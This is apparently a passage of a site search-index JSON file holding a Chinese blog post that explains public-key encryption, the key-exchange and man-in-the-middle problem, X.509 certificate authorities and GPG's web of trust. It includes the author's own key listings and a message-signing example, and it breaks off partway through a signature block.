\u4fe1\u606f\u5b89\u5168 * \u5bc6\u7801\u5b66 \u672c\u6587\u7531\u6211\u53bb\u5e74 6 \u6708\u5728 LeanCloud \u7684\u4e00\u6b21\u6280\u672f\u5206\u4eab\u6574\u7406\u800c\u6765\uff0c\u9700\u8981\u8bfb\u8005\u5bf9\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u6709\u57fa\u672c\u7684\u4e86\u89e3\u3002 \u5982\u679c\u63d0\u5230 GPG \u90a3\u4e48\u4e0d\u5f97\u4e0d\u63d0\u7684\u5c31\u662f\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\uff0c\u9996\u5148\u6211\u4eec\u5148\u6765\u5feb\u901f\u5730\u4e86\u89e3\u4e00\u4e0b\u6700\u77e5\u540d\u7684\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5 \u2014\u2014 RSA\uff1a\u5728 RSA \u4e2d\u6709\u300c\u516c\u94a5\u300d\u548c\u300c\u79c1\u94a5\u300d\u4e24\u79cd\u5bc6\u94a5\uff0c\u5176\u4e2d\u79c1\u94a5\u53ef\u4ee5\u5bfc\u51fa\u516c\u94a5\uff0c\u4f46\u516c\u94a5\u65e0\u6cd5\u53cd\u63a8\u79c1\u94a5\u3002\u5982\u679c\u7528\u516c\u94a5\u52a0\u5bc6\u6570\u636e\u7684\u8bdd\uff0c\u90a3\u4e48\u53ea\u6709\u79c1\u94a5\u53ef\u4ee5\u89e3\u5bc6\uff1b\u5982\u679c\u4f7f\u7528\u79c1\u94a5\u7b7e\u540d\u6570\u636e\u7684\u8bdd\uff0c\u90a3\u4e48\u53ef\u4ee5\u9a8c\u7b7e\u540d\u3002","title":"GPG \u4e0e\u7aef\u5230\u7aef\u52a0\u5bc6\uff1a\u8bba\u4ec0\u4e48\u624d\u662f\u53ef\u4ee5\u4fe1\u4efb\u7684   \u67e5\u770b\u6e90\u4ee3\u7801"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_1","text":"\u987e\u540d\u601d\u4e49\uff0c\u901a\u5e38\u6211\u4eec\u4f1a\u5c06\u516c\u94a5\u516c\u5f00\u5730\u53d1\u5e03\uff0c\u4f5c\u4e3a\u81ea\u5df1\u8eab\u4efd\u7684\u4ee3\u8868\uff0c\u5c31\u597d\u50cf\u7528\u6237\u540d\u4e00\u6837\uff08\u867d\u7136\u662f\u4e00\u4e2a\u96be\u4ee5\u8bb0\u5fc6\u7684\u968f\u673a\u5b57\u7b26\u4e32\uff09\uff1b\u800c\u5c06\u79c1\u94a5\u79d8\u5bc6\u5730\u4fdd\u5b58\uff0c\u4f5c\u4e3a\u8eab\u4efd\u7684\u8bc1\u660e\uff0c\u5c31\u50cf\u5bc6\u7801\u4e00\u6837\u3002\u5982\u679c\u4e00\u4e2a\u8d26\u6237\u662f\u7531\u4e00\u4e2a\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\u5bf9\u6240\u4fdd\u62a4\u7684\uff0c\u90a3\u6211\u4eec\u79f0\u4e4b\u4e3a\u300c\u5bc6\u7801\u5b66\u8d26\u6237\u300d\uff0c\u6211\u4eec\u8eab\u8fb9\u5e38\u89c1\u7684\u5bc6\u7801\u5b66\u8d26\u6237\u5305\u62ec\uff1a SSL \u8bc1\u4e66\uff08\u7528\u4e8e HTTPS \u7b49\u52a0\u5bc6\u901a\u8baf\uff09 S/MIME \u8bc1\u4e66\uff08\u7528\u4e8e\u90ae\u4ef6\u52a0\u5bc6\u548c\u8ba4\u8bc1\uff09 SSH \u5bc6\u94a5\uff08\u7528\u4e8e\u767b\u5f55\u670d\u52a1\u5668\u7684\u51ed\u8bc1\uff09 Bitcoin \u94b1\u5305 GPG ID \u8fd9\u4e9b\u8d26\u6237\u548c\u6211\u4eec\u901a\u5e38\u6ce8\u518c\u7684\u4e92\u8054\u7f51\u670d\u52a1\u5f88\u4e0d\u4e00\u6837\uff0c\u5728\u6211\u4eec\u901a\u5e38\u6ce8\u518c\u7684\u4e92\u8054\u7f51\u670d\u52a1\u4e2d\uff0c\u4f60\u7684\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u7531\u7f51\u7ad9\u7684\u7ef4\u62a4\u8005\u7ba1\u7406\u7684\uff0c\u4f60\u4e3a\u8d26\u6237\u8bbe\u7f6e\u7684\u5bc6\u7801\u5e76\u6ca1\u6709\u771f\u7684\u7528\u6765\u52a0\u5bc6\u6570\u636e\uff0c\u800c\u53ea\u662f\u4e00\u79cd\u8bc1\u660e\u8d26\u6237\u6240\u6709\u6743\u7684\u51ed\u8bc1\uff0c\u5728\u6bcf\u6b21\u767b\u5f55\u65f6\u4f60\u5411\u7f51\u7ad9\u53d1\u9001\u5bc6\u7801\uff0c\u6765\u8bc1\u660e\u81ea\u5df1\u662f\u8d26\u6237\u7684\u6240\u6709\u8005\u3002\u4e00\u65e6\u4f60\u5fd8\u8bb0\u4e86\u5bc6\u7801\uff0c\u7f51\u7ad9\u7684\u7ef4\u62a4\u8005\u5728\u901a\u8fc7\u5176\u4ed6\u6e20\u9053\uff08\u90ae\u7bb1\u5730\u5740\u3001\u624b\u673a\u53f7\u7801\uff09\u786e\u8ba4\u4e86\u4f60\u7684\u8eab\u4efd\u4e4b\u540e\uff0c\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u4f60\u91cd\u7f6e\u5bc6\u7801\u3002 \u800c\u5728\u5bc6\u7801\u5b66\u8d26\u6237\u4e2d\uff0c\u4f60\u62e5\u6709\u8d26\u6237\u7684\u552f\u4e00\u51ed\u8bc1\u5c31\u662f\u4f60\u7684\u5bc6\u94a5\u5bf9 \u2014\u2014 \u901a\u5e38\u662f\u8ba1\u7b97\u673a\u4e0a\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f60\u901a\u8fc7\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u94a5\u5bf9\u8fdb\u884c\u7b7e\u540d\u6765\u7ba1\u7406\u4f60\u7684\u8d26\u6237\u3001\u8fdb\u884c\u89e3\u5bc6\u6765\u8bbf\u95ee\u673a\u5bc6\u6570\u636e\u3002\u5bc6\u7801\u5b66\u8d26\u6237\u65e2\u662f\u66f4\u52a0\u5b89\u5168\u7684\uff08\u4e0d\u5b58\u5728\u5177\u6709\u7279\u6743\u7684\u7ba1\u7406\u8005\uff09\uff0c\u540c\u65f6\u4e5f\u662f\u66f4\u52a0\u5371\u9669\u7684\uff08\u4e00\u65e6\u4e22\u5931\u65e0\u6cd5\u627e\u56de\uff1b\u4e00\u65e6\u6cc4\u6f0f\u4e5f\u65e0\u6cd5\u91cd\u7f6e\uff09\u3002","title":"\u5bc6\u7801\u5b66\u8d26\u6237"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_2","text":"\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u770b\u4e0a\u53bb\u5f88\u7f8e\u597d\uff0c\u4e00\u65e6\u6211\u4eec\u6709\u4e86\u5bf9\u65b9\u7684\u516c\u94a5\uff0c\u53ea\u9700\u5728\u901a\u8baf\u65f6\u7528\u5bf9\u65b9\u7684\u516c\u94a5\u52a0\u5bc6\u6570\u636e\uff0c\u5c31\u4e07\u65e0\u4e00\u5931\u4e86\uff0c\u4f46\u8fd9\u5176\u4e2d \u6700\u8584\u5f31\u7684\u4e00\u4e2a\u73af\u8282\u5c31\u662f\u300c\u5f97\u5230\u5bf9\u65b9\u7684\u516c\u94a5\u300d\uff0c\u5373\u300c\u516c\u94a5\u4ea4\u6362\u300d \u3002 \u4e0a\u56fe\u662f\u7406\u60f3\u7684\u60c5\u51b5\uff0cA \u548c B \u4e92\u76f8\u4e4b\u95f4\u4ea4\u6362\u516c\u94a5\uff0c\u540e\u7eed\u7684\u901a\u8baf\u5c31\u53ef\u4ee5\u4ee5\u52a0\u5bc6\u7684\u65b9\u5f0f\u8fdb\u884c\u4e86\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u51fa\u73b0\u4e86\u4e00\u4e2a\u80fd\u591f\u76d1\u542c\u548c\u7be1\u6539 A \u548c B \u4e4b\u95f4\u7684\u901a\u8baf\u7684 C\uff0c\u7136\u540e\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u53d1\u7ed9 A \u548c B\uff0c\u5c31\u53d8\u6210\u4e86\u8fd9\u6837\uff1a A \u548c B \u90fd\u4ee5\u4e3a\u81ea\u5df1\u5f97\u5230\u4e86\u5bf9\u65b9\u7684\u516c\u94a5\uff0c\u4f46\u5b9e\u9645\u4e0a\u4ed6\u4eec\u5f97\u5230\u7684\u90fd\u662f\u4e2d\u95f4\u4eba C \u7684\u516c\u94a5\uff0c\u8fd9\u610f\u5473\u7740\u4ed6\u4eec\u4e4b\u540e\u7684\u901a\u8baf\u90fd\u4f1a\u4ee5 C \u7684\u516c\u94a5\u6765\u52a0\u5bc6\uff0cC \u4fbf\u53ef\u4ee5\u5728\u4e2d\u95f4\u7ee7\u7eed\u8fdb\u884c\u7a83\u542c\u548c\u7be1\u6539\u3002 \u6240\u4ee5\u5728\u7406\u8bba\u4e0a \u4e0d\u53ef\u80fd\u5b58\u5728\u4e00\u79cd\u5728\u7ebf\u7684\u3001\u53ef\u9760\u7684\u3001\u4e0d\u4e8b\u5148\u534f\u5546\u7684\u516c\u94a5\u4ea4\u6362\u673a\u5236 \uff0c\u56e0\u4e3a\u4ea4\u6362\u516c\u94a5\u610f\u5473\u7740\u53cc\u65b9\u8fd8\u6ca1\u6709\u5f00\u59cb\u52a0\u5bc6\u901a\u8baf\uff0c\u4ea4\u6362\u7684\u8fc7\u7a0b\u81ea\u7136\u6ca1\u6709\u4fdd\u969c\u3002\u90a3\u4e48\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u6211\u4eec\u662f\u5982\u4f55\u89e3\u51b3\u516c\u94a5\u4ea4\u6362\u7684\u95ee\u9898\u7684\u5462\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b SSL \u6240\u4f7f\u7528\u7684 X.509 \u8bc1\u4e66\u4f53\u7cfb\uff1a \u5728 X.509 \u4e2d\u6709\u4e00\u4e2a\u88ab\u79f0\u4e3a\u300c\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u300d\u7684\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\uff0cCA \u7684\u6570\u91cf\u8f83\u4e3a\u6709\u9650\uff0c\u8d44\u683c\u53d8\u5316\u4e5f\u5e76\u4e0d\u9891\u7e41\uff0c\u6240\u6709\u6d4f\u89c8\u5668\uff08browser\uff09\u90fd\u5185\u7f6e\u4e86 CA \u7684\u516c\u94a5\u3002\u800c\u7f51\u7ad9\u65b9\uff08website\uff09\u5728\u751f\u6210\u4e86\u81ea\u5df1\u7684\u516c\u94a5\u540e\uff0c\u9700\u8981\u5148\u627e CA \u5bf9\u81ea\u5df1\u7684\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\u7136\u540e\u624d\u80fd\u4f7f\u7528\u3002\u5f53\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e00\u4e2a\u65b0\u7684\u7f51\u7ad9\u65f6\uff0c\u7f51\u7ad9\u65b9\u9700\u8981\u63d0\u4f9b\u7ecf\u8fc7 CA \u7b7e\u540d\u7684\u516c\u94a5\uff0c\u6d4f\u89c8\u5668\u4f7f\u7528\u5185\u7f6e\u7684 CA \u516c\u94a5\u6765\u9a8c\u8bc1\u7b7e\u540d\uff0c\u786e\u4fdd\u6536\u5230\u7684\u7f51\u7ad9\u7684\u516c\u94a5\u6ca1\u6709\u88ab\u7be1\u6539\u8fc7\u3002 X.509 \u5b9e\u9645\u4e0a\u5c31\u662f\u8981\u6c42\u5927\u5bb6\u4fe1\u4efb\u4e00\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\u5e76\u5c06\u5b83\u4eec\u7684\u516c\u94a5\u5185\u7f6e\u5728\u5ba2\u6237\u7aef\u4e2d\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b8c\u7f8e\u7684\u65b9\u6848\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u4f53\u7cfb\u4e2d CA \u6709\u7740\u975e\u5e38\u5927\u7684\u6743\u529b\uff0c\u4e00\u65e6 CA \u4e0d\u6309\u7167\u89c4\u5219\u7b7e\u53d1\u8bc1\u4e66\uff0c\u90a3\u4e48\u5ba2\u6237\u7aef\u662f\u65e0\u6cd5\u5bdf\u89c9\u8fd9\u79cd\u653b\u51fb\u884c\u4e3a\u7684\u3002","title":"\u516c\u94a5\u4ea4\u6362"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#gpg_1","text":"GPG \u662f PGP\uff08Pretty Good Privacy\uff09\u7684\u4e00\u4e2a GPL \u5b9e\u73b0\uff0c\u4e5f\u662f\u76ee\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u5b9e\u73b0\u3002 \u300c\u4fe1\u4efb\u4e00\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\u300d\u5bf9\u4e8e\u4e00\u4e9b\u53bb\u4e2d\u5fc3\u5316\u7231\u597d\u8005\u662f\u65e0\u6cd5\u63a5\u53d7\u7684\uff1a\u9996\u5148\u6211\u4eec\u51ed\u4ec0\u4e48\u53bb\u4fe1\u4efb\u8fd9\u4e2a\u7b2c\u4e09\u65b9\uff0c\u5176\u6b21\u5728 CA \u7533\u9886\u8bc1\u4e66\u901a\u5e38\u4e5f\u662f\u9700\u8981\u4ed8\u8d39\u7684\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u53ef\u80fd\u53bb\u9664\u8fd9\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\uff0c\u800c\u5141\u8bb8\u5927\u5bb6\u4e92\u76f8\u8fdb\u884c\u8ba4\u8bc1\u5462\uff1f\u5982\u4f55\u786e\u8ba4\u4e00\u4e2a\u516c\u94a5\u5c31\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u4eba\u7684\u5462\uff1f\u8fd9\u5c31\u662f\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u4ecb\u7ecd\u7684 GPG \u7684\u4fe1\u4efb\u6a21\u578b\uff1a \u5728 GPG \u7684\u4fe1\u4efb\u6a21\u578b\u4e2d\uff0c\u7528\u6237\u4e92\u76f8\u4e4b\u95f4\u5bf9\u516c\u94a5\u8fdb\u884c\u8ba4\u8bc1\uff08\u901a\u8fc7\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u8fdb\u884c\u7b7e\u540d\u7684\u65b9\u5f0f\uff09\uff0c\u4f8b\u5982 Alice \u548c Bob \u662f\u5f88\u597d\u7684\u670b\u53cb\uff0c\u8981\u4e48 Alice \u5c31\u4f1a\u7528\u81ea\u5df1\u79c1\u94a5\u7ed9 Bob \u7684\u516c\u94a5\u7b7e\u540d\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u7b7e\u540d\u901a\u8fc7 Key Server \u5e7f\u64ad\u7ed9\u5176\u4ed6\u4eba\u3002Key Server \u4ec5\u4ec5\u7528\u6765\u4ea4\u6362\u516c\u94a5\u548c\u7b7e\u540d\uff0c\u56e0\u4e3a\u7b7e\u540d\u672c\u8eab\u662f\u53ef\u6821\u9a8c\u7684\uff0c\u6240\u4ee5 Key Server \u5e76\u6ca1\u6709\u4efb\u4f55\u7279\u6743\u3002 \u5f53\u53e6\u5916\u4e00\u4e2a Alice \u7684\u670b\u53cb\u770b\u5230 Bob \u7684\u516c\u94a5\uff0c\u5e76\u4e14\u53d1\u73b0 Alice \u7ed9 Bob \u7684\u516c\u94a5\u7b7e\u8fc7\u540d\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u4ed6\u7684\u670b\u53cb Alice \u5df2\u7ecf\u68c0\u67e5\u8fc7 Bob \u7684\u516c\u94a5\u4e86\uff0c\u5982\u679c\u770b\u5230\u66f4\u591a\u670b\u53cb\u7ed9 Bob \u7b7e\u8fc7\u540d\uff0c\u90a3\u4e48\u5c31\u51e0\u4e4e\u53ef\u4ee5\u8ba4\u5b9a Bob \u7684\u8eab\u4efd\u662f\u771f\u5b9e\u7684\u3002 \u6240\u4ee5 GPG \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u7531\u300c\u719f\u4eba\u5173\u7cfb\u300d\u5efa\u7acb\u8d77\u7684\u4fe1\u4efb\u7f51\u7edc\uff0c\u5f53\u4f60\u8ba4\u53ef\u4e00\u4e2a\u4eba\u7684\u8eab\u4efd\uff0c\u5373\u8ba4\u53ef\u8fd9\u4e2a\u516c\u94a5\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u4eba\u7684\uff0c\u4f60\u4fbf\u53ef\u4ee5\u7ed9\u4ed6\u7684\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\uff0c\u5f62\u6210\u4e00\u79cd\u4fe1\u4efb\u5173\u7cfb\uff0c\u540c\u65f6\u8fd9\u79cd\u4fe1\u4efb\u5173\u7cfb\u53c8\u662f\u53ef\u4ee5\u4f20\u9012\u7684\u3002\u5f53\u4f60\u7684 GPG \u901a\u8baf\u5f55\u4e2d\u6709\u4e86\u4e00\u4e9b\u4e92\u76f8\u4fe1\u4efb\u7684\u670b\u53cb\u4e4b\u540e\uff0c\u4fbf\u53ef\u57fa\u4e8e\u8fd9\u4e2a\u5173\u7cfb\u7f51\u6765\u62d3\u5c55\u4f60\u7684\u670b\u53cb\u5708\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u524d\u9762\u63d0\u5230\u4e0d\u53ef\u80fd\u6709\u4e00\u4e2a\u5728\u7ebf\u7684\u3001\u53ef\u9760\u7684\u3001\u4e0d\u4e8b\u5148\u534f\u5546\u7684\u516c\u94a5\u4ea4\u6362\u673a\u5236\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4fe1\u4efb\u7f51\u7edc\u5728\u4e00\u5f00\u59cb\u662f\u5982\u4f55\u5efa\u7acb\u8d77\u6765\u7684\u5462\uff1f\u7b54\u6848\u662f\u4f7f\u7528\u5206\u6563\u7684\u3001\u591a\u6e20\u9053\u7684\u3001\u53ef\u80fd\u662f\u7ebf\u4e0b\u7684\u65b9\u5f0f\u6765\u4ea4\u6362\u548c\u786e\u8ba4\u516c\u94a5\u3002\u5982\u679c\u4f7f\u7528\u4e00\u4e2a\u56fa\u5b9a\u7684\u534f\u8bae\u53bb\u4ea4\u6362\u516c\u94a5\uff0c\u800c\u4e14\u8fd9\u4e2a\u534f\u8bae\u672c\u8eab\u6ca1\u6709\u52a0\u5bc6\u4fdd\u62a4\uff0c\u90a3\u4e48\u5f53\u7136\u5bb9\u6613\u88ab\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f46\u5982\u679c\u4e24\u4e2a\u4eba\u540c\u65f6\u4f7f\u7528\u591a\u79cd\u6e20\u9053\u6765\u4ea4\u6362\u516c\u94a5\uff0c\u4f8b\u5982\u5148\u7528\u90ae\u4ef6\u53d1\u4e00\u6b21\u3001\u518d\u7528\u5fae\u4fe1\u53d1\u4e00\u6b21\u3001\u6700\u540e\u518d\u7528\u7535\u8bdd\u8bf4\u4e00\u6b21\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6e20\u9053\u540c\u65f6\u88ab\u653b\u51fb\u7684\u53ef\u80fd\u6027\u4f1a\u975e\u5e38\u5c0f\u3002 \u6216\u8005\u66f4\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7ebf\u4e0b\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u786e\u8ba4\uff0c\u5b9e\u9645\u4e0a\u5f88\u591a\u6280\u672f\u7c7b\u4f1a\u8bae\u7ed3\u675f\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a Key Signing Party \u7684\u6d3b\u52a8\uff0c\u5927\u5bb6\u9762\u5bf9\u9762\u5730\u786e\u8ba4\u8eab\u4efd\uff08\u4f60\u53ef\u80fd\u6709\u5fc5\u8981\u51fa\u793a\u5370\u6709\u7167\u7247\u7684\u8bc1\u4ef6\uff0c\u4f8b\u5982\u8eab\u4efd\u8bc1\u6216\u62a4\u7167\uff09\uff0c\u7528\u7eb8\u548c\u7b14\u8bb0\u4e0b\u516c\u94a5\uff0c\u7136\u540e\u56de\u5bb6\u8fdb\u884c\u7b7e\u540d\u548c\u4e0a\u4f20\u3002 \u6700\u540e\u4f60\u4fbf\u5f97\u5230\u4e86\u4e00\u4e9b\u6765\u81ea\u5176\u4ed6\u4eba\u7b7e\u540d\uff0c\u4ee3\u8868\u4ed6\u4eec\u8ba4\u53ef\u4e86\u4f60\u7684\u8eab\u4efd\uff0c\u5373\u8ba4\u53ef\u4e86\u67d0\u4e00\u4e2a GPG \u516c\u94a5\u4ee3\u8868\u4e86\u4f60\u3002","title":"GPG"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#gpg_2","text":"\u56e0\u4e3a GPG \u9700\u8981\u7528\u6237\u81ea\u5df1\u7ef4\u62a4\u4fe1\u4efb\u5173\u7cfb\uff0c\u56e0\u6b64\u6bcf\u4e2a GPG \u7684\u7528\u6237\u90fd\u4f1a\u6709\u4e00\u4e2a\u901a\u8baf\u7c3f\uff0c\u91cc\u9762\u662f\u5927\u91cf\u7684\u516c\u94a5\uff08\u4ee3\u8868\u7740\u4e00\u4e2a\u5176\u4ed6\u7528\u6237\uff09\u548c\u7b7e\u540d\uff08\u4ee3\u8868\u7740\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u4e0b\u9762\u662f\u6211\u7684\u901a\u8baf\u5f55\u4e2d\u4e0e\u6211\u81ea\u5df1\u76f8\u5173\u7684\u90e8\u5206\uff1a ~> gpg --list-keys jysperm pub 4096R/E466CF1E 2014-11-23 [expires: 2017-05-17] uid [ultimate] Wang Ziting <jysperm@gmail.com> uid [ultimate] Wang Ziting <jysperm@icloud.com> uid [ultimate] [jpeg image of size 1476] sub 2048R/1D795875 2014-11-23 [expires: 2017-05-17] sub 2048R/289286B3 2014-11-23 [expires: 2017-05-17] sub 2048R/35B5DE4D 2016-05-17 [expires: 2017-05-17] \u5176\u4e2d E466CF1E \u662f\u6211\u7684\u300c\u6839\u516c\u94a5\u300d\u7684\u7b80\u5199\u5f62\u5f0f\uff0c 4096R \u8868\u793a\u8fd9\u662f\u4e00\u4e2a 4096 bit \u7684 RSA \u5bc6\u94a5\u5bf9\uff0c\u521b\u5efa\u65f6\u95f4\u662f 2014-11-23 \uff0c\u6709\u6548\u671f\u81f3 2017-05-17 \u3002\u4e00\u4e2a GPG \u5e10\u53f7\u4e0b\u53ef\u4ee5\u6709\u591a\u4e2a uid\uff0c\u6211\u53ef\u4ee5\u4f7f\u7528\u6839\u516c\u94a5\u7b7e\u7f72\u7c7b\u4f3c\u4e8e\u300c jysperm@gmail.com \u662f\u6211\u7684\u90ae\u7bb1\u5730\u5740\u300d\u7684\u7b7e\u540d\uff0c\u6765\u5c06\u81ea\u5df1\u7684\u591a\u4e2a\u8eab\u4efd\u5173\u8054\u5230\u4e00\u8d77\uff0c\u4e0a\u9762\u7684 3 \u4e2a uid \u5373\u6211\u7684 2 \u4e2a\u90ae\u7bb1\u5730\u5740\u548c\u4e00\u4e2a\u5934\u50cf\u56fe\u7247\u3002 \u6211\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6839\u516c\u94a5\u7b7e\u7f72\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u300c\u6211\u6388\u6743 1D795875 \u4e3a\u6211\u7684\u5b50\u5bc6\u94a5\uff0c\u53ef\u4ee5\u4ee3\u66ff\u6211\u8fdb\u884c\u7b7e\u540d\u7b49\u64cd\u4f5c\u300d\u7684\u6d88\u606f\u6765\u6dfb\u52a0\u989d\u5916\u7684\u5b50\u5bc6\u94a5\uff0c\u4f8b\u5982\u4e0a\u9762\u7684\u4e09\u4e2a sub \u5c31\u662f\u4e09\u4e2a\u4e0d\u540c\u529f\u80fd\u7684\u5b50\u5bc6\u94a5\u3002\u5c31\u50cf\u8fd9\u6837\uff0c\u5176\u5b9e\u5bf9\u4e8e GPG \u5e10\u53f7\u7684\u7ba1\u7406\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u7528\u79c1\u94a5\u7b7e\u540d\u6d88\u606f\u6765\u5b9e\u73b0\u7684\u3002 \u8fd8\u53ef\u4ee5\u5217\u51fa\u4e0e\u6211\u6709\u5173\u7684\u7b7e\u540d\uff1a ~> gpg --list-sigs jysperm pub 4096R/E466CF1E 2014-11-23 [expires: 2017-05-17] uid Wang Ziting <jysperm@gmail.com> sig C07CFB96 2016-05-04 paomian <qtang@leancloud.rocks> sig 3 7CDC82A7 2015-05-11 Yeechan Lu <wz.bluesnow@gmail.com> sig 3 E466CF1E 2016-05-17 Wang Ziting <jysperm@gmail.com> sig E411E711 2016-06-02 keybase.io/librazy <librazy@keybase.io> sig B0B002B8 2016-07-13 dennis (Dennis Zhuang) <killme2008@gmail.com> \u8fd9\u91cc\u770b\u5230\u9664\u4e86\u6211\u81ea\u5df1\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u56db\u4e2a\u4eba\u4e3a\u6211 [ jysperm@gmail.com](mailto: jysperm@gmail.com) \u8fd9\u4e2a uid \u8fdb\u884c\u4e86\u7b7e\u540d\uff0c\u8ba4\u53ef\u4e86 E466CF1E \u8fd9\u4e2a\u516c\u94a5\u5c5e\u4e8e Wang Ziting jysperm@gmail.com ` \u8fd9\u4e2a\u4eba\u3002\u5bf9\u4ed6\u4eba\u7684\u7b7e\u540d\u4e5f\u662f\u53ef\u4ee5\u533a\u5206\u4e0d\u540c\u7684\u7ea7\u522b\u7684\uff0c\u4f8b\u5982\u5bf9\u4e8e\u300c\u5728\u8bba\u575b\u4e0a\u6df7\u4e86\u4e2a\u8138\u5c5e\u300d\u548c\u300c\u6bcf\u5929\u90fd\u89c1\u9762\u7684\u540c\u4e8b\u300d\u4f60\u53ef\u4ee5\u7ed9\u4e88\u4e0d\u540c\u7ea7\u522b\u7684\u7b7e\u540d\u6765\u66f4\u51c6\u786e\u5730\u8868\u8fbe\u4fe1\u4efb\u5173\u7cfb","title":"GPG \u901a\u8baf\u7c3f"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#gpg_3","text":"\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86 GPG \u7684\u4fe1\u4efb\u6a21\u578b\u548c\u901a\u8baf\u7c3f\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u54ea\u4e9b\u573a\u666f\u4e0b\u4f7f\u7528 GPG \u5462\uff1f \u9996\u5148\u662f\u4f60\u53ef\u4ee5\u7528\u5b83\u7b7e\u540d\u4e00\u6bb5\u6d88\u606f\uff1a ~> echo 'hello' | gpg --clearsign -a -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 hello -----BEGIN PGP SIGNATURE----- iQIcBAEBAgAGBQJXfifAAAoJELQPOvDkZs8epZAP/3/jP6k1Dev2a8i8KfY7VDfv TVGl61kLEbgpgR3mWXFL7PaJ8SyW8N0Dv3cJhYbY8NGp8wbkZa7cUS7DkTb2ArhS M+IKUJtwUwbfp5fOyT+esaDLWatqjSJ+5IjWX8BOnh5SnLNMURDxsYrJMShfecTD tbBfnEkIeCFBwIfE0Xs5m23+6i7t77ZgLdn1qpWLTRNpd6Fzi0B653Kr8dREPflI MAsn6CP90pX55V0LnsZGiAgZV+34iFolhFDd7N5mtPT/zF7OToN2SNJF3YOVikBp M+1WJL9W8x9DwzhOq8AmPgHIEwBZVNS8Nv+UNadIZJuexR0ERl64e8MdTLft0Qui ChjUiD7ibkLR433jcms+2EJ04xd6Ie0mp/nH5nMLY1mEgHtLMXql6VHQCbJt80Vf ZrL2J+BF9Sk1zPh9Hn5NGe+RLX1d/CZ62rYMICRcEwiS9vpWq6m9ouSMNZUYr8S5 